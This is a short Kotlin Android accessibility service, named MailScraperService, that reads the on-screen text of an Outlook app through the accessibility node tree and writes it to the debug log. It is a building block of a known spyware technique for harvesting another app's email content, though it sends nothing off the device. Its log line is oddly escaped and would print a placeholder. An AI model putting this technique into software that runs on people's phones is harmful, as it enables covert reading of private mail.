package com.example.services

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class MailScraperService : AccessibilityService() {
    companion object {
        const val TAG = "MailScraperService"
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            val rootNode = rootInActiveWindow ?: return
            if (rootNode.packageName?.toString()?.contains("outlook") == true) {
                // Example of scraping text:
                val textNodes = mutableListOf<String>()
                extractText(rootNode, textNodes)
                if (textNodes.isNotEmpty()) {
                    Log.d(TAG, "Scraped Text: \${textNodes.joinToString(\" \")}")
                }
            }
        }
    }

    private fun extractText(node: AccessibilityNodeInfo, textList: MutableList<String>) {
        if (node.text != null && node.text.toString().isNotBlank()) {
            textList.add(node.text.toString())
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                extractText(child, textList)
                child.recycle()
            }
        }
    }

    override fun onInterrupt() {
        Log.e(TAG, "Accessibility Service Interrupted")
    }
}
